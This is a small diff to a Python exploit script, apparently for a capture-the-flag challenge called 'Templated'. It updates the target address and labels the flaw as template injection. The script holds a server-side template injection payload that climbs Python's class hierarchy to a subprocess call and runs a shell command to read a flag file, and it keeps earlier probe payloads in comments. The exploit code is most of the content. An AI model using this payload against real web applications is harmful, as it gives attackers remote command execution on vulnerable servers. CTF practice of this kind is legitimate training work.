@@ -1,9 +1,14 @@
 #!/usr/bin/python3
 
+# Templated
+
+# Vulnerability
+# Template Injection
+
 import requests
 
 def connect():
-    url = 'http://188.166.173.208:31388/'
+    url = 'http://167.172.55.94:32217/'
     #payload = "{{7*7}}"
     #payload = "{{ config.items() }}"
     payload = "{{ ''.__class__.__mro__[1].__subclasses__()[414]('cat flag.txt',shell=True,stdout=-1).communicate()[0].strip() }}"
